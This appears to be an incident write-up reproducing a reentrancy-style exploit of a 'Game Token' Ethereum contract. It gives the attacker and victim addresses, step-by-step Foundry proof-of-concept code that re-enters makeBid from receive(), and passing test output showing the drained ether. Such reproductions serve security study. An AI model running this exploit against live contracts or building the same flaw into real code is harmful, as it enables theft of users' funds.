# FLIX Token Attack Incident

## Information
+ Protocol Name: Game Token
+ Total Loss: 20 ETH
+ Network: Ethereum Mainnet
  
+ Attacker: 0x145766a51ae96e69810fe76f6f68fd0e95675a0b
+ Attack Contract: 0x8d4de2bc1a566b266bd4b387f62c21e15474d12a
+ Victim Contract: 0x52d69c67536f55efefe02941868e5e762538dbd6
+ Transaction: 0x0eb8f8d148508e752d9643ccf49ac4cb0c21cbad346b5bbcf2d06974d31bd5c4

## Reproduction
1. Add funding token and configure block number:

```solidity
uint256 constant forkBlock = 19_213_946;
address constant fundToken = address(0);
```

2. Add constant variable:

```solidity
address internal Game = 0x52d69c67536f55EfEfe02941868e5e762538dBD6;
uint256 internal lastBid = 0;
```

3. Add label in `setup` function
```solidity
vm.label(address(Game), "Game");
```

4. Add necessary interface for victim contract
```solidity
interface IGame {
    function newBidEtherMin() external view returns (uint256);
    function makeBid() external payable;
    function bidEther() external view returns (uint256);
}
```

5. Execute exploit process:
```solidity
// Helper Function
function exploit() public {
  uint256 minBidAmount = IGame(Game).newBidEtherMin();
  IGame(Game).makeBid{value: minBidAmount + 1}();
}
```

```solidity
// Fallback & Receive Function
receive() external payable {
  uint256 minBidAmount = IGame(Game).newBidEtherMin();
  if (address(this).balance > minBidAmount + 1 && Game.balance > IGame(Game).bidEther()) {
      lastBid = minBidAmount + 1;
      exploit();
  }
}
```

```Solidity
// Attack Execution
uint256 bidAmount = address(this).balance / 2;
IGame(Game).makeBid{value: bidAmount}();
exploit();
```
6. Run forge command and check the final result:

Command
```bash
forge test --mc GameTokenTest -vvv
```

Result
```bash
Ran 1 test for test/Game/PoC.t.sol:GameTokenTest
[PASS] testExploit() (gas: 2195240)
Logs:
  Attacker Token Balance Before Exploit:  600000000000000000
  Attacker Token Balance After Exploit:  31364999999999999891

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.90s (19.85ms CPU time)
```